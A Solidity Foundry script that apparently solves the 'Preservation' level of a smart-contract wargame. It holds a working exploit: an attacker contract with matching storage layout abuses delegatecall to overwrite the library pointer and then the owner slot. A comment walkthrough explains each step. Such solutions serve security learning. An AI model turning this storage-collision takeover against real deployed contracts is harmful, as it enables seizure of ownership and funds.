// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Broadcast} from "./helper/Broadcast.sol";
import {Preservation, LibraryContract} from "../src/L16Preservation.sol";

// 0xB6351eA8b3d83ab563b4d1Fb7818eC231205AF68

/**
 * Walkthrough
 * Highlevel - Delegate call preserve context and change the caller's state. It changes the state according to the sequence of the variable.
 * 1. Using attacker contract to call setFirstTime passing attacker contract address. This uses the setTime function in LibraryContract and consequently set timeZone1Library address because both are in slot 0;
 * 2. Now the timeZone1Library points to attacker contract.
 * 3. Attacker contract variables are declared in the same order as Preservation contract.
 * 4. Calling setFirstTime one more time and pass our wallet address, this will change the preservation owner's address to our address.
 */
contract Attacker {
    address public t1;
    address public t2;
    address public owner;

    Preservation preservation = Preservation(0xB6351eA8b3d83ab563b4d1Fb7818eC231205AF68);

    function attack() public {
        console.log("Current t1 address:", preservation.timeZone1Library());

        preservation.setFirstTime(uint256(uint160(address(this))));

        console.log("New t1 address:", preservation.timeZone1Library());

        preservation.setFirstTime(uint256(uint160(address(0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266))));
    }

    function setTime(uint256 _owner) public {
        owner = address(uint160(uint256(_owner)));
    }
}

contract L16PreservationAttack is Script, Broadcast {
    Preservation preservation = Preservation(0xB6351eA8b3d83ab563b4d1Fb7818eC231205AF68);

    function run() public broadcast {
        Attacker attacker = new Attacker();
        attacker.attack();
        console.log("New owner:", preservation.owner());
    }
}
